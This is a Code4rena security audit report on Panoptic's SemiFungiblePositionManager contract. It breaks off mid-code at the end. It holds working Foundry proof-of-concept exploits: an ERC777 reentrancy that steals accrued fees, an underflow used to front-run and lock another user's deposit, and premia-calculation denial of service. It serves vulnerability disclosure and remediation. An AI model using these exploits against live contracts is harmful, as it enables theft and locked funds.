# Panoptic 

Type: CONTEST

Dates: 28 Nov 2023 - 12 Dec 2023

https://code4rena.com/audits/2023-11-panoptic

Code Under Review: 1

More contest details: undefined

Rank: undefined

# Findings Summary

- High : 2
- Medium : 3


|ID|Title|Severity|
|-|:-|:-:|
| [H-01](#H-01)| Attacker can steal all fees from SFPM in pools with ERC777 tokens. | High |
| [H-02](#H-02)| Token balances can be made to not correctly reflect the underlying position | High |
| [M-01](#M-01)| removedLiquidity can be underflowed to lock other user's deposits | Medium |
| [M-02](#M-02)| premia calculation can cause DOS | Medium |
| [M-03](#M-03)| Reentrancy lock can be disabled for the first mint | Medium |


# Detailed Findings

# <a id='H-01'></a>H-01 Attacker can steal all fees from SFPM in pools with ERC777 tokens.

## Impact
An attacker can steal all fees in case of ERC 777 tokens

## Proof of Concept
When minting a position, `s_accountFeesBase` is updated only after the token transfer to Uniswap.
```solidity
    function _createLegInAMM(
        IUniswapV3Pool _univ3pool,
        uint256 _tokenId,
        uint256 _leg,
        uint256 _liquidityChunk,
        bool _isBurn
    ) internal returns (int256 _moved, int256 _itmAmounts, int256 _totalCollected) {
        
        ..........

            s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
                updatedLiquidity
            );
        }

        {
            
            .......... 


            _moved = isLong == 0
=>              ? _mintLiquidity(_liquidityChunk, _univ3pool)
                : _burnLiquidity(_liquidityChunk, _univ3pool); // from msg.sender to Uniswap
            
        ............

=>          s_accountFeesBase[positionKey] = _getFeesBase(
            _univ3pool,
            updatedLiquidity,
            _liquidityChunk
        );
    }
```

In case of an ERC-777 token a user can reenter `SemiFungiblePositionManager` and transfer the position/token to another one of his controlled address. 
This will cause the transferred address to have the updated liquidity but the old `feesBase` and the remaining calculation in the original address to have a reduced `feeBase`. This can be used to earn higher fees than what should actually be distributed to the user

```solidity
    function registerTokenTransfer(address from, address to, uint256 id, uint256 amount) internal {
        
            ...........

            int256 fromBase = s_accountFeesBase[positionKey_from];

            s_accountLiquidity[positionKey_to] = fromLiq;
            s_accountLiquidity[positionKey_from] = 0;

            // @audit sets feeBase of current address to 0. the fees calculation after reentry will use this value
            s_accountFeesBase[positionKey_to] = fromBase;
            s_accountFeesBase[positionKey_from] = 0;
```
```solidity
    function _collectAndWritePositionData(
        uint256 liquidityChunk,
        IUniswapV3Pool univ3pool,
        uint256 currentLiquidity,
        bytes32 positionKey,
        int256 movedInLeg,
        uint256 isLong
    ) internal returns (int256 collectedOut) {
        uint128 startingLiquidity = currentLiquidity.rightSlot();
        int256 amountToCollect = _getFeesBase(univ3pool, startingLiquidity, liquidityChunk).sub(
            s_accountFeesBase[positionKey]
        );
```
### Example Scenario
feesBase is shown as single token variable for ease
1. Attacker mints a position with liquidity = 100 and feeBase = 1000
2. Attacker again mints a position with liquidity = 100. In the hook, the attacker reenters the `SemiFungiblePositionManager` and transfers the entire token amount to another address. 
3. The new address will have liquidity = 200 and feeBase = 1000 and the attacker will have 0 feeBase for the current calculation. Both of these will increase the fees gained by the attacker. The 0 feeBase will allow the attacker to steal all the fees accounted to the `SemiFungiblePositionManager` by using the above steps

Another attack possible is to transfer a position where the liquidity is low ( instead of adding in the above steps the attacker withdraws majority of the liquidity keeping a negligible amount left) and the feeBase is high. This will cause the fees calculation in the transferred address to revert hence disabling any mint on that position

### POC Code
Set fork_block_number = 18706858
Run : `forge test --mt testHash_FeesBaseReentry`
```diff
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..90c6c48 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -20,6 +20,7 @@ import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
 import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
 import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
 import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
+import {INonfungiblePositionManager} from "v3-periphery/interfaces/INonfungiblePositionManager.sol";
 import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {PositionUtils} from "../testUtils/PositionUtils.sol";
@@ -50,6 +51,15 @@ contract UniswapV3FactoryMock {
     }
 }
 
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 _interfaceHash, address implementer) external;
+}
+
+interface IMBTC {
+    function addMinter(address account) external;
+    function mint(address recipient, uint256 amount, bytes calldata userData, bytes calldata operatorData) external;
+}
+
 contract SemiFungiblePositionManagerTest is PositionUtils {
     using TokenId for uint256;
     using LeftRight for uint256;
@@ -81,6 +91,8 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
     IUniswapV3Pool[3] public pools = [USDC_WETH_5, USDC_WETH_5, USDC_WETH_30];
 
+    address imBTC = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
+    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
     /*//////////////////////////////////////////////////////////////
                               WORLD STATE
     //////////////////////////////////////////////////////////////*/
@@ -239,6 +251,139 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
 
     function setUp() public {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
+        address imbtcusdcpool = V3FACTORY.createPool(imBTC, usdc, 500);
+        uint160 startPrice = 1584563250285286800000000000000;
+        IUniswapV3Pool(imbtcusdcpool).initialize(startPrice);
+        _cacheWorldState(IUniswapV3Pool(imbtcusdcpool));
+        sfpm.initializeAMMPool(token0, token1, fee);
+    }
+
+    function testHash_FeesBaseReentry() public {
+        assert(token0 == imBTC);
+
+        // setup erc 777 callback
+        IERC1820Registry imbtcRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+        // keccak256("ERC777TokensSender")
+        bytes32 TOKENS_SENDER_INTERFACE_HASH = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
+        imbtcRegistry.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
+
+        // add minter to imbtc to add test funds since deal() fails
+        vm.prank(0xb9E29984Fe50602E7A619662EBED4F90D93824C7);
+        IMBTC(imBTC).addMinter(address(this));
+
+        int24 strike = (currentTick / tickSpacing * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+        int24 lowTick = strike - tickSpacing;
+        int24 highTick = strike + tickSpacing;
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 0, 0, 0, strike, width);
+        uint128 posSize = 103e8;
+
+        // initial setup. accure fees in tick range so that feeGrowth doesn't start from 0 as else there would be no effect if an attacker explicity makes feebase 0
+
+        IMBTC(imBTC).mint(Alice, type(uint128).max, "", "");
+        deal(usdc, Alice, type(uint128).max);
+
+        vm.startPrank(Alice);
+
+        address uniswapNFTManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
+        IERC20Partial(imBTC).approve(uniswapNFTManager, type(uint256).max);
+        IERC20Partial(usdc).approve(uniswapNFTManager, type(uint256).max);
+        IERC20Partial(imBTC).approve(address(router), type(uint256).max);
+        IERC20Partial(usdc).approve(address(router), type(uint256).max);
+
+        // mint using nft manager and accrue fees
+        INonfungiblePositionManager(uniswapNFTManager).mint(
+            INonfungiblePositionManager.MintParams(
+                token0, token1, fee, lowTick, highTick, posSize, 0, 0, 0, Alice, block.timestamp
+            )
+        );
+        uint256 amountReceived = router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 200_000_0e6, 0, 0)
+        );
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
+        );
+        vm.stopPrank();
+
+        IMBTC(imBTC).mint(address(this), type(uint128).max, "", "");
+        IERC20Partial(imBTC).approve(address(sfpm), type(uint256).max);
+        deal(usdc, address(this), type(uint128).max);
+        IERC20Partial(usdc).approve(address(sfpm), type(uint256).max);
+
+        // attacker mints token 1
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        address anotherUser = address(0x12323184392234);
+
+        IMBTC(imBTC).mint(anotherUser, type(uint128).max, "", "");
+        deal(usdc, anotherUser, type(uint128).max);
+
+        // another user mints in the same position
+
+        vm.startPrank(anotherUser);
+
+        IERC20Partial(imBTC).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(usdc).approve(address(sfpm), type(uint256).max);
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        vm.stopPrank();
+
+        // new fees accrual which both the attacker and anotherUser has equal shares of
+
+        IERC20Partial(imBTC).approve(address(router), type(uint256).max);
+        IERC20Partial(usdc).approve(address(router), type(uint256).max);
+        amountReceived = router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 200_000_0e6, 0, 0)
+        );
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
+        );
+
+        // fees has been accrued
+        vm.prank(address(sfpm));
+        pool.burn(lowTick, highTick, 0);
+
+        (,,, uint128 tokensOwed0, uint128 tokensOwed1) =
+            pool.positions(keccak256(abi.encodePacked(address(sfpm), lowTick, highTick)));
+        assert(tokensOwed0 > 0);
+        assert(tokensOwed1 > 0);
+
+        // attacker mints token 2. this time attacker reenters and transfers the token to another address resetting the feeBase to 0 for the attacker and hence steals all the fees
+        reenter = true;
+        reenterTransferTokenId = shortTokenId;
+        reenterTransferAmount = posSize * 2;
+
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        // all fees have been captured by attacker
+        (,,, tokensOwed0, tokensOwed1) = pool.positions(keccak256(abi.encodePacked(address(sfpm), lowTick, highTick)));
+
+        assert(tokensOwed0 == 0);
+        assert(tokensOwed1 == 0);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+
+    bool reenter = false;
+    uint256 reenterTransferTokenId;
+    uint128 reenterTransferAmount;
+
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
+        if (reenter) {
+            // transfer all the tokens to another address causing the feeBase to be 0 for the current address and a lowered one for the transferred address
+            address ally = address(0x1232111312312);
+            sfpm.safeTransferFrom(address(this), ally, reenterTransferTokenId, reenterTransferAmount, "");
+        }
     }
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Add non-reentrant modifier on the transfer functions of `SemiFungiblePositionManager` or change the flow to update the `s_accountFeesBase` before Uniswap interaction and use the initial feeBase itself for the fees computation. By burning 0 amount before making the mint/burn liquidity call, the new `feeGrowthInside` can be obtained to update the `s_accountFeesBase`

# <a id='H-02'></a>H-02 Token balances can be made to not correctly reflect the underlying position

## Impact
Token balances won't relect underlying position

## Proof of Concept
When transferring, the entire liquidity position is transferred to the other user. The checks done for the sender are:
1. the user has enough of the token (if transferring x amount of token, the user is supposed to have x amount)
2. the liquidity amount corresponding to the token amount is equal to the current `netLiquidity` of the position

This makes many paths possible where the token balances of an address doesn't represent the underlying position
Eg: 
1. User mints short with posSize = 100 getting liquidity 100
2. User mints long with posSize = 50 making netLiquidity = 50 and removedLiquidity = 50
3. User transfers the short token with amount 50 amount.
Now the user has 50 short token and 100 long token although the user's liquidity position is 0

It is also not checked whether the token being transferred represents a `short` even though the `netLiquidity` is moved
 
## Tools Used
Manual review

## Recommended Mitigation Steps
If not intended behaviour, seperate the transfer of `removedLiquidity` and `netLiquidity` based on `long/short` nature of the token leg and decrease the `feeBase` for `short` transfers.

# <a id='M-01'></a>M-01 removedLiquidity can be underflowed to lock other user's deposits

## Impact
1. Attacker can cause deposits of other users to be locked
2. Attacker can manipulate the `premia` calculated for attacker's own position to extremely high levels

## Proof of Concept
When burning a long token, the `removedLiquidity` is subtracted in an unchecked block
```solidity
    function _createLegInAMM(
        IUniswapV3Pool _univ3pool,
        uint256 _tokenId,
        uint256 _leg,
        uint256 _liquidityChunk,
        bool _isBurn
    ) internal returns (int256 _moved, int256 _itmAmounts, int256 _totalCollected) {
        
        .............

        unchecked {
           
            .........

            if (isLong == 0) {
               
                updatedLiquidity = startingLiquidity + chunkLiquidity;

                if (_isBurn) {
=>                  removedLiquidity -= chunkLiquidity;
                }
```
An underflow can be produced here by the following (burning is done after transferring the current position): 

1. Mint a short token.
2. Mint a long token of same position size to remove the netLiquidity added. This is the token that we will burn in order to underflow the `removedAmount`
3. Use `safeTransferFrom` to clear the current position. By passing in 0 as the token amount, we can move the position to some other address while still retaining the token amounts. This will set the netLiquidity and removedLiquidity to 0.
4. Burn the previously minted long token. This will cause the removedLiquidity to underflow to `2 ** 128 - prevNetLiquidity` and increase the netLiquidity
5. Burn the previously minted short token. This will set the netLiquidity to 0

The ability to obtain such a position allows an attacker to perform a variety of attacks.

### Lock other user's first time (have liquidity and feesBase 0) deposits by front-running 

If the `totalLiquidity` of a position is equal to `2 ** 128`, the premia calculation will revert due to division by zero 

```solidity
    function _getPremiaDeltas(
        uint256 currentLiquidity,
        int256 collectedAmounts
    ) private pure returns (uint256 deltaPremiumOwed, uint256 deltaPremiumGross) {
        // extract liquidity values
        uint256 removedLiquidity = currentLiquidity.leftSlot();
        uint256 netLiquidity = currentLiquidity.rightSlot();

        unchecked {
            uint256 totalLiquidity = netLiquidity + removedLiquidity;

        ........
    
    // @audit if totalLiquidity == 2 ** 128, sq == 2 ** 256 == 0 since unchecked. mulDiv reverts on division by 0

=>                  premium0X64_gross = Math
                        .mulDiv(premium0X64_base, numerator, totalLiquidity ** 2)
                        .toUint128();
                    premium1X64_gross = Math
                        .mulDiv(premium1X64_base, numerator, totalLiquidity ** 2)
                        .toUint128();
```

An attacker can exploit this by creating a position with `removedLiquidity == 2 ** 128 - depositorLiquidity` and `netLiquidity == 0`. The attacker can then front run and transfer this position to the depositor following which the funds will be lost/locked if burn is attempted without adding more liquidity or fees has been accrued on the position (causable by the attacker)

Instead of matching exactly with `2 ** 128 - depositorLiquidity` an attacker can also keep `removedLiquidity` extremely close to `type(uint128).max` in which case depending on the depositor's amount, a similar effect will take place due to casting errors

Another less severe possibility for the attacker is to keep `netLiquidity` slightly above 0 (some other amount which will cause fees collected to be non-zero and hence invoke the `_getPremiaDeltas`) and transfer to target address causing DOS since any attempt to `mint` will result in revert due to premia calculation

### Manipulate the premia calculation
Instead of making `totalLiquidity == 2 ** 128`, an attacker can choose values for `netLiquidity` and `removedLiquidity` such that `totalLiquidity > 2 ** 128`. This will disrupt the premia calculation

Example values:
```
uint256 netLiquidity = 92295168568182390522;
uint128 collected0 = 1000;
uint256 removedLiquidity = 2 ** 128 - 1000;

calculated deltaPremiumOwed =  184221893349665448120
calculated deltaPremiumGross = 339603160599738985487650139090815393758
```

### POC Code
Set fork_block_number = 18706858
For the division by 0 revert lock run : `forge test --mt testHash_DepositAmountLockDueToUnderflowDenomZero`
For the casting error revert lock run : `forge test --mt testHash_DepositAmountLockDueToUnderflowCastingError`
```diff
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..f5b6110 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import {stdMath} from "forge-std/StdMath.sol";
 import {Errors} from "@libraries/Errors.sol";
 import {Math} from "@libraries/Math.sol";
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
 import {CallbackLib} from "@libraries/CallbackLib.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {LeftRight} from "@types/LeftRight.sol";
@@ -241,6 +241,127 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
     }
 
+    function testHash_DepositAmountLockDueToUnderflowDenomZero() public {
+        _initWorld(0);
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        int24 strike = (currentTick / tickSpacing * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 1, 0, 0, strike, width);
+
+        // size of position alice is about to deposit
+        uint128 posSize = 1e18;
+        uint128 aliceToGetLiquidity =
+            LiquidityChunk.liquidity(PanopticMath.getLiquidityChunk(shortTokenId, 0, posSize, tickSpacing));
+
+        // front run
+        vm.stopPrank();
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        // mint short and convert it to removed amount by minting a corresponding long
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // move these amounts somewhere by passing 0 as the token amount. this will set removedLiquidity and netLiquidity to 0 while still retaining the tokens
+        sfpm.safeTransferFrom(address(this), address(0x1231), longTokenId, 0, "");
+
+        // burn the long position. this will cause underflow and set removedAmount == uint128 max - alice deposit.
+        sfpm.burnTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // the above burn will make the netLiquidity == alice deposit size. if we are to burn the netLiquidity amount now to make it 0, it will cause a revert due to sum being 2**128. hence increase the amount
+        sfpm.mintTokenizedPosition(shortTokenId, 2 * posSize, type(int24).min, type(int24).max);
+
+        // the following pattern is used to burn as directly attempting to burn 3 * posSize would revert due to roudning down performed at the time of minting
+        sfpm.burnTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.burnTokenizedPosition(shortTokenId, 2 * posSize, type(int24).min, type(int24).max);
+
+        uint256 acc =
+            sfpm.getAccountLiquidity(address(pool), address(this), 0, strike - tickSpacing, strike + tickSpacing);
+        assert(acc.rightSlot() == 0);
+        assert(acc.leftSlot() == 2 ** 128 - aliceToGetLiquidity);
+
+        // front-run Alice's deposit
+        sfpm.safeTransferFrom(address(this), Alice, shortTokenId, 0, "");
+        uint256 aliceDepositTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        vm.prank(Alice);
+        sfpm.mintTokenizedPosition(aliceDepositTokenId, posSize, type(int24).min, type(int24).max);
+
+        // all attempt to withdraw funds by Alice will revert due to division by 0 in premia calculation
+        vm.prank(Alice);
+        vm.expectRevert();
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, posSize, type(int24).min, type(int24).max);
+
+        vm.prank(Alice);
+        vm.expectRevert();
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, posSize / 2 + 1, type(int24).min, type(int24).max);
+    }
+
+    function testHash_DepositAmountLockDueToUnderflowCastingError() public {
+        _initWorld(0);
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        int24 strike = (currentTick / tickSpacing * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 1, 0, 0, strike, width);
+
+        // low posSize to have the underflowed amount close to max and to round down in uniswap when withdrawing liquidity which will allow us to have netLiquidity of 0
+        uint128 posSize = 1000;
+        vm.stopPrank();
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        // mint short and convert it to removed amount by minting a corresponding long
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // move these amounts somewhere by passing 0 as the token amount. this will set removedLiquidity and netLiquidity to 0 while still retaining the tokens
+        sfpm.safeTransferFrom(address(this), address(0x1231), longTokenId, 0, "");
+
+        // burn the long position. this will cause underflow and set removedAmount close to uint128 max. but it will make the netLiquidity non-zero. burn the short position to remove the netLiquidity without increasing removedLiquidity
+        sfpm.burnTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.burnTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        uint256 acc =
+            sfpm.getAccountLiquidity(address(pool), address(this), 0, strike - tickSpacing, strike + tickSpacing);
+        assert(acc.rightSlot() == 0);
+        assert(acc.leftSlot() > 2 ** 127);
+
+        // front-run Alice's deposit
+        sfpm.safeTransferFrom(address(this), Alice, shortTokenId, 0, "");
+        uint256 aliceDepositTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        vm.prank(Alice);
+        sfpm.mintTokenizedPosition(aliceDepositTokenId, 10e18, type(int24).min, type(int24).max);
+
+        // fees accrual in position
+        vm.prank(Swapper);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 1000e18, 0, 0)
+        );
+        (, int24 tickAfterSwap,,,,,) = pool.slot0();
+
+        assert(tickAfterSwap > tickLower);
+
+        // after fees accrual Alice cannot withdraw the amount due to reverting in premia calculation
+        vm.prank(Alice);
+        vm.expectRevert(Errors.CastingError.selector);
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, 10e18, type(int24).min, type(int24).max);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Check if `removedLiquidity` is greater than `chunkLiquidity` before subtracting

# <a id='M-02'></a>M-02 premia calculation can cause DOS

## Impact
1. Attacker can cause DOS for certain addresses
2. Normal operations can lead to self DOS

## Proof of Concept
In case the `removedLiquidity` is high and the `netLiquidity` is extremely low, the calculation in `_getPremiaDeltas` will revert since the calculated amount cannot be casted to `uint128`
```solidity
    function _getPremiaDeltas(
        uint256 currentLiquidity,
        int256 collectedAmounts
    ) private pure returns (uint256 deltaPremiumOwed, uint256 deltaPremiumGross) {
        
        uint256 removedLiquidity = currentLiquidity.leftSlot();
        uint256 netLiquidity = currentLiquidity.rightSlot();

            uint256 totalLiquidity = netLiquidity + removedLiquidity;

            uint128 premium0X64_base;
            uint128 premium1X64_base;

            {
                uint128 collected0 = uint128(collectedAmounts.rightSlot());
                uint128 collected1 = uint128(collectedAmounts.leftSlot());

                // compute the base premium as collected * total / net^2 (from Eqn 3)
                premium0X64_base = Math
=>                  .mulDiv(collected0, totalLiquidity * 2 ** 64, netLiquidity ** 2)
                    .toUint128();
``` 
Whenever minting/burning, if the `netLiquidity` and `amountToCollect` are non-zero, the premia calculation is invoked
```solidity
    function _collectAndWritePositionData(
        uint256 liquidityChunk,
        IUniswapV3Pool univ3pool,
        uint256 currentLiquidity,
        bytes32 positionKey,
        int256 movedInLeg,
        uint256 isLong
    ) internal returns (int256 collectedOut) {

        .........

        if (amountToCollect != 0) {
           
            ..........

            _updateStoredPremia(positionKey, currentLiquidity, collectedOut);
        }
```
This can be affected in the following ways:
1. For protocols built of top of SFPM, an attacker can long amounts such that a dust amount of liquidity is left. Following this when fees get accrued in the position, the amount to collect will become non-zero and will cause the `mints` to revert. 
2. Under normal operations, longs/burns of the entire token amount in pieces (ie. if short was of posSize 200 and 2 longs of 100 are made) can also cause dust since liquidity amount will be rounded down in each calculation
3. An attacker can create such a position himself and transfer this position to another address following which the transferred address will not be able to mint any tokens in that position

### Example Scenarios
1. Attacker making : 
For `PEPE/ETH` attacker opens a short with 100_000_000e18 PEPE. This gives > 2 ** 71 liquidity and is worth around 100$.
Attacker mints long `100_000_000e18 - 1000` making `netLiquidity` equal to a very small amount and making `removedLiquidity` > 2 ** 71. Once enough fees is accrued, further mints on this position is disabled for this address.

2. Dust accrual due to round down :

Liquidity position ranges:
        tickLower = 199260
        tickUpper = 199290

Short amount (== token amount):        
        amount0 = 219738690
        liquidityMinted = 3110442974185905

Long amount 1 == amount0/2 = 109869345
Long amount 2 == amount0/2 = 109869345
Liquidity removed = 1555221487092952 * 2 = 3110442974185904

Dust = 1

When the feeDifference becomes non-zero (due to increased dust by similar operations / accrual of fees in the range), similar effect to above scenario will be observed

### POC Code
Set fork_block_number = 18706858 and run `forge test --mt testHash_PremiaRevertDueToLowNetHighLiquidity`
For dust accrual POC run : `forge test --mt testHash_DustLiquidityAmount`
```diff
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..e9eef27 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import {stdMath} from "forge-std/StdMath.sol";
 import {Errors} from "@libraries/Errors.sol";
 import {Math} from "@libraries/Math.sol";
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
 import {CallbackLib} from "@libraries/CallbackLib.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {LeftRight} from "@types/LeftRight.sol";
@@ -55,7 +55,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     using LeftRight for uint256;
     using LeftRight for uint128;
     using LeftRight for int256;
-
+    using LiquidityChunk for uint256;
     /*//////////////////////////////////////////////////////////////
                            MAINNET CONTRACTS
     //////////////////////////////////////////////////////////////*/
@@ -79,6 +79,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
     IUniswapV3Pool constant USDC_WETH_30 =
         IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
+    IUniswapV3Pool constant PEPE_WETH_30 = IUniswapV3Pool(0x11950d141EcB863F01007AdD7D1A342041227b58);
     IUniswapV3Pool[3] public pools = [USDC_WETH_5, USDC_WETH_5, USDC_WETH_30];
 
     /*//////////////////////////////////////////////////////////////
@@ -189,7 +190,8 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     /// @notice Set up world state with data from a random pool off the list and fund+approve actors
     function _initWorld(uint256 seed) internal {
         // Pick a pool from the seed and cache initial state
-        _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        // _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        _cacheWorldState(PEPE_WETH_30);
 
         // Fund some of the the generic actor accounts
         vm.startPrank(Bob);
@@ -241,6 +243,93 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
     }
 
+    function testHash_PremiaRevertDueToLowNetHighLiquidity() public {
+        _initWorld(0);
+        vm.stopPrank();
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        int24 strike = ((currentTick / tickSpacing) * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+        int24 lowTick = strike - tickSpacing;
+        int24 highTick = strike + tickSpacing;
+    
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 0, 0, 0, strike, width);
+
+        uint128 posSize = 100_000_000e18; // gives > 2**71 liquidity ~$100
+
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        uint256 accountLiq = sfpm.getAccountLiquidity(address(PEPE_WETH_30), address(this), 0, lowTick, highTick);
+        
+        assert(accountLiq.rightSlot() > 2 ** 71);
+        
+        // the added liquidity is removed leaving some dust behind
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 1, 0, 0, strike, width);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2 , type(int24).min, type(int24).max);
+
+        // fees is accrued on the position
+        vm.startPrank(Swapper);
+        uint256 amountReceived = router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 100e18, 0, 0)
+        );
+        (, int24 tickAfterSwap,,,,,) = pool.slot0();
+        assert(tickAfterSwap > lowTick);
+        
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
+        );
+        vm.stopPrank();
+
+        // further mints will revert due to amountToCollect being non-zero and premia calculation reverting
+        vm.expectRevert(Errors.CastingError.selector);
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+    }
+
+    function testHash_DustLiquidityAmount() public {
+        int24 tickLower = 199260;
+        int24 tickUpper = 199290;
+
+        /*  
+            amount0 219738690
+            liquidity initial 3110442974185905
+            liquidity withdraw 3110442974185904
+        */
+        
+        uint amount0 = 219738690;
+
+        uint128 liquidityMinted = Math.getLiquidityForAmount0(
